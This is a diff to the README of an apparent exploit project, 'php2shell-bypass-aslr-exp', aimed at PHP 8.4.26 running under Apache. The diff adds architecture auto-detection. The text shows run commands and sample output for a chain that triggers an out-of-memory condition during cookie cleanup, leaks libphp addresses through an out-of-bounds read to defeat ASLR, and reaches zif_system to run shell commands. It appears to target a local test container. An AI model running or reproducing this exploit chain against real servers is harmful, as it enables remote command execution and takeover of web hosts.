@@ -33,6 +33,7 @@ cd php2shell-bypass-aslr-exp
 #    official php.ini-production to php.ini.
 ./pure/run_pure.sh
 # target: OK
+# architecture: x86_64 (run exploit with --arch x86_64)
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
@@ -40,10 +41,11 @@ cd php2shell-bypass-aslr-exp
 
 # 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
 python3 exploit.py --port 18110
+#       --arch auto (default): detect x86_64 / aarch64 from the leak
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
-#       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
+#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
 #       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
 #                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
 # [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
@@ -54,7 +56,8 @@ python3 exploit.py --port 18110
 No PHP/Apache build, no image build, no gdb, no ini changes.
 `pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
 default with the image's official prefork configuration
-(MaxRequestWorkers=150), and prints the effective ini and MPM values.
+(MaxRequestWorkers=150), and prints the architecture plus the effective ini
+and MPM values.
 `--single` mounts the non-official one-worker override
 `pure/docker/apache-single-worker.conf` instead (use it with `--workers 1`);
 `docker/apache.conf` is only a compatibility symlink to that file for
@@ -72,7 +75,7 @@ python3 exploit.py --port 18110 --restart p2s-pure-18110
 # Official workers are the default; --workers 1 is for a --single target
 python3 exploit.py --port 18110 --workers 1
 
-# Native ARM64 target (x86_64 remains the default)
+# ARM64 can also be forced (default --arch auto detects it)
 python3 exploit.py --arch aarch64 --port 18110 --workers 1
 
 # Arbitrary command: write a script into the mounted directory, then run sh
